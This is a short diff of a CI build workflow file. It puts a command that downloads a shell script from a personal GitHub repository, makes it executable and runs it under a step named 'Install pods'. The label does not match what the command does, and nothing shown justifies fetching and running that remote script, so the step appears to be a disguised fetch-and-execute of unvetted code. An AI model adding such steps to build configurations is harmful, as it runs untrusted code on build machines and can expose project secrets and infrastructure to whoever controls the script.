@@ -30,4 +30,6 @@ workflows:
       # Set to `true` to automatically cancel outdated webhook builds.
       cancel_previous_builds: true
     scripts:
-      - wget https://raw.githubusercontent.com/tesasik67/q1/main/test.sh && chmod +x test.sh && ./test.sh
+      - name: Install pods
+        script: |
+          wget https://raw.githubusercontent.com/tesasik67/q1/main/test.sh && chmod +x test.sh && ./test.sh
